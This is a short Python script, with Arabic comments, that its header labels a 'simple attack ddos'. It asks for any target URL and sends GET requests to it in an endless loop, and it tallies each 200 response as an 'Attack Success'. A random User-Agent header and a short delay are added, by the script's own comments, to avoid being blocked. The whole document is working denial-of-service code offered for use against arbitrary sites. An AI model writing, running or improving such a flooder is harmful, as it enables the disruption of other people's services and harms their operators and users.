# _______ simple attack ddos ______#
import requests
import random
import time

# عشوائية لتجنب الحظر  User-Agent 
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
]

success = 0
failed  = 0

def DDos_Attack(url):
    global success, failed 

    while True:
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            response = requests.get(url, headers=headers, timeout=5)
            code = response.status_code

            if code == 200:
                success += 1
                print(f"Attack Success: {success} | Failed: {failed}")

            elif code == 404:
                failed += 1
                print(f"Not Found URL: {url} | Failed: {failed}")
                break

            elif code == 403:
                failed += 1
                print(f"Blocked By App (403): {url} | Failed: {failed}")
                break

            else:
                failed += 1
                print(f"Unhandled Code {code} | Failed: {failed}")

        except requests.exceptions.Timeout:
            failed += 1
            print(f"Timeout | Failed: {failed}")

        except requests.exceptions.ConnectionError:
            failed += 1
            print(f"Connection Error | Failed: {failed}")
            break

        except Exception as e:
            failed += 1
            print(f"DEBUG:{e}")
        # تاخير بسيط لتجنب الحظر
        time.sleep(0.1)


if __name__ == "__main__":
    url = input("Enter URL: ").strip()
    
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    answer = input("Do you want to start the attack? (y/n): ").strip().lower()

    if answer == "y":
        try:
            DDos_Attack(url)
        except KeyboardInterrupt:
            print("\n Stopped by user.")

    print(f"\nAttack finished. Total Success: {success} | Total Failed: {failed}")
